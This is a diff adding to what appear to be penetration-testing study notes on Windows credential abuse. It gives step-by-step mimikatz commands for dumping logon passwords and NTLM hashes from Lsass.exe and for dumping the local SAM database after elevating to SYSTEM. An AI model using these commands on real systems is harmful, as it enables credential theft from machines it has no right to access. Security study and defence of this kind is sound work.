@@ -23,3 +23,20 @@ Requires specific privileges.
 **Other**
 - impersonating tokens
 - -> see pdf "05F Credential Abuse.pdf"
+
+## Dump Logon passwords from Lsass.exe 
+
+1. `.\mimikatz.exe`  -> start mimikatz prompt
+2. `privilege::debug` -> aquire debug privilege to spy into other processes (which we have to be admin)
+    - expected response: "Privilege '20' OK"
+3. `log my_log.txt` -> enable logging (highly recommended)
+4. `sekurlsa::logonpasswords` ->  retrieve our credentials
+    - Check the output for NTLM hash
+
+
+## Dump local passward from SAM
+1. If mimikatz is not started yet: `.\mimikatz.exe` 
+2. `token::elevate` -> elevate our permissions to SYSTEM  (see UAC levels, needed for SAM)
+3. if not done before: `log my_log.txt` -> enable logging (highly recommended)
+3. `lsadump::sam` -> will dump content SAM
+    - Check the output for NTLM hash
